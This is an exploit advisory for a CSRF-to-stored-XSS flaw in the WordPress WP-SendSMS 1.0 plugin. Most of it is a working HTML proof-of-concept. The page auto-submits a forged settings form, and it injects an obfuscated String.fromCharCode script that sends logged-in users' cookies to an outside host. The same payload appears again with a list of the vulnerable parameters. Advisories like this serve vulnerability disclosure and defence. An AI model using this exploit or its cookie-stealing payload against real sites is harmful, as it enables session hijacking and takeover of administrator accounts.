@@ -1,0 +1,137 @@
+=============================================================
+        __   __          _    ___    _   __   ____         
+        \ \ / /         | |  / _ \  (_) /_ | |___ \        
+   ___   \ V /   _ __   | | | | | |  _   | |   __) |  _ __ 
+  / _ \   > <   | '_ \  | | | | | | | |  | |  |__ <  | '__|
+ |  __/  / . \  | |_) | | | | |_| | | |  | |  ___) | | |   
+  \___| /_/ \_\ | .__/  |_|  \___/  |_|  |_| |____/  |_|   
+                | |                                        
+                |_|              blackpentesters.blogspot.com
+=============================================================
+
+###########################################################################################
+# Exploit Title: [ Wordpress WP-SendSMS v1.0 Plugin  CSRF and Stored XSS Vulnerabilities] #
+# Date: [2013-6-9]							             	  #
+# Exploit Author: [expl0i13r]						     	     	  #
+# Vendor Homepage: [http://wordpress.org/plugins/wp-sendsms/] 				  #
+# Software Link: [http://downloads.wordpress.org/plugin/wp-sendsms.1.1.zip]         	  #
+# Version: [1.0]			                                             	  #		
+# Tested on: [Wordpress 3.5.1 (Windows)]						  #
+# Contact: expl0i13r@gmail.com						             	  #
+###########################################################################################
+
+Summary:
+========
+ 1. Plugin Description
+ 2. CSRF to Trigger Stored XSS
+ 3. Stored XSS Details
+
+
+1. Plugin Description:
+========================
+
+WP-SendSMS is WordPress Plugin for allowing user to send SMS using SMS Gateway.
+This Plugin allows site owner to add SMS Gateway in Plugin Setting Page.
+
+
+2. CSRF to Trigger Stored XSS :
+===============================
+
+
+Vulnerability Description:
+---------------------------
+
+This wordpress plugin "WP-SendSMS 1.0" suffers from CSRF vulnerability which can be successfully exploited to trigger Stored XSS vulnerability which in turn sends Wordpress logged in user's cookie to attacker's website.
+
+Attacker can also exploit this CSRF vulnerability to change SMS Settings.
+
+
+Affected URL:
+--------------
+
+http://127.0.0.1/wordpress-3.5.1/wordpress/wp-admin/admin.php?page=sms
+
+
+eXpl0it code:
+--------------
+
+<html>
+<head>
+<script type="text/javascript" language="javascript">
+function submitform()
+{
+ 	document.getElementById('myForm').submit();
+}
+</script>
+</head>
+<body>
+<form name="myForm" action="http://127.0.0.1/wordpress-3.5.1/wordpress/wp-admin/admin.php?page=sms" method="post">
+
+<textarea name="wpsms_api1" id="wpsms_api1" class="regular-text" cols="100" rows="5">http://blackpentesters.blogspot.com/smsapi.php?username=yourusername&password=yourpassword&mobile=[Mobile]&sms=[TextMessage]&senderid=[SenderID]&lt;/textarea&gt;
+
+<input type="text" name="sender_id" id="sender_id" value="eXpl0i13r">
+<input type="checkbox" name="remove_bad_words" id="remove_bad_words" checked="checked" value="1"> 
+
+# Below Field Contains XSS Payload for sending Cookies to attacker website :
+# In my case this will redirect you to http://blackpentesters.blogspot.com+cookies
+
+<input type="text" name="maximum_characters" class="maximum_characters" id="maximum_characters" value=""><script>location=String.fromCharCode(104)+String.fromCharCode(116)+String.fromCharCode(116)+String.fromCharCode(112)+String.fromCharCode(58)+String.fromCharCode(47)+String.fromCharCode(47)+String.fromCharCode(98)+String.fromCharCode(108)+String.fromCharCode(97)+String.fromCharCode(99)+String.fromCharCode(107)+String.fromCharCode(112)+String.fromCharCode(101)+String.fromCharCode(110)+String.fromCharCode(116)+String.fromCharCode(101)+String.fromCharCode(115)+String.fromCharCode(116)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(115)+String.fromCharCode(46)+String.fromCharCode(98)+String.fromCharCode(108)+String.fromCharCode(111)+String.fromCharCode(103)+String.fromCharCode(115)+String.fromCharCode(112)+String.fromCharCode(111)+String.fromCharCode(116)+String.fromCharCode(46)+String.fromCharCode(99)+String.fromCharCode(111)+String.fromCharCode(109)+String.fromCharCode(47)+String.fromCharCode(63)+document.cookie</script>">
+
+<input type="checkbox" name="captcha" id="captcha" checked="checked" value="1">  
+<input type="text" name="captcha_width" class="captcha_option_input" value="" id="acpro_inp4">
+<input type="text" name="captcha_height" class="captcha_option_input" value="" id="acpro_inp5">
+<input type="text" name="captcha_characters" class="captcha_option_input" value="4" id="acpro_inp6">
+<input type="checkbox" name="confirm_page" id="confirm_page" checked="checked" value="1"> 
+<input type="checkbox" name="allow_without_login" id="allow_without_login" checked="checked" value="1"> 
+<input type="checkbox" name="custom_response" id="custom_response" value="1">
+<textarea name="custom_response_text" cols="100" rows="5">&lt;/textarea&gt;
+<input type="hidden" name="settings_submit" value="true">
+<input type="submit" value="Update Settings" class="button-primary">
+</form>
+
+<script type="text/javascript" language="javascript">
+document.myForm.submit()
+</script>
+</body>
+</html>
+
+
+Stored XSS Details :
+=====================
+
+URL:
+=====
+http://127.0.0.1/wordpress-3.5.1/wordpress/wp-admin/admin.php?page=sms
+
+Stored XSS Vulnerable Parameters:
+==================================
+1. sender_id
+2. maximum_characters
+3. captcha_width
+4. captcha_height
+4. captcha_characters
+
+HTML Code :
+-------------
+<input type="text" name="sender_id" id="sender_id" value="">
+<input type="text" name="maximum_characters" class="maximum_characters" id="maximum_characters" value="">
+<input type="text" name="captcha_width" class="captcha_option_input" value="1" id="acpro_inp4">
+<input type="text" name="captcha_height" class="captcha_option_input" value="1" id="acpro_inp5">
+<input type="text" name="captcha_characters" class="captcha_option_input" value="" id="acpro_inp6">
+
+XSS Payload Used:
+------------------
+
+"><script>location=String.fromCharCode(104)+String.fromCharCode(116)+String.fromCharCode(116)+String.fromCharCode(112)+String.fromCharCode(58)+String.fromCharCode(47)+String.fromCharCode(47)+String.fromCharCode(98)+String.fromCharCode(108)+String.fromCharCode(97)+String.fromCharCode(99)+String.fromCharCode(107)+String.fromCharCode(112)+String.fromCharCode(101)+String.fromCharCode(110)+String.fromCharCode(116)+String.fromCharCode(101)+String.fromCharCode(115)+String.fromCharCode(116)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(115)+String.fromCharCode(46)+String.fromCharCode(98)+String.fromCharCode(108)+String.fromCharCode(111)+String.fromCharCode(103)+String.fromCharCode(115)+String.fromCharCode(112)+String.fromCharCode(111)+String.fromCharCode(116)+String.fromCharCode(46)+String.fromCharCode(99)+String.fromCharCode(111)+String.fromCharCode(109)+String.fromCharCode(47)+String.fromCharCode(63)+document.cookie</script>
+
+
+Each of above parameters can be exploited by attacker through CSRF vulnerability for stealing Cookies.
+
+
+##################################
+#           eXpl0i13r            #
+# ------------------------------ #
+#|blackpentesters.blogspot.com	|#
+#|infotech-knowledge.blogspot.in|#
+# ------------------------------ #
+##################################
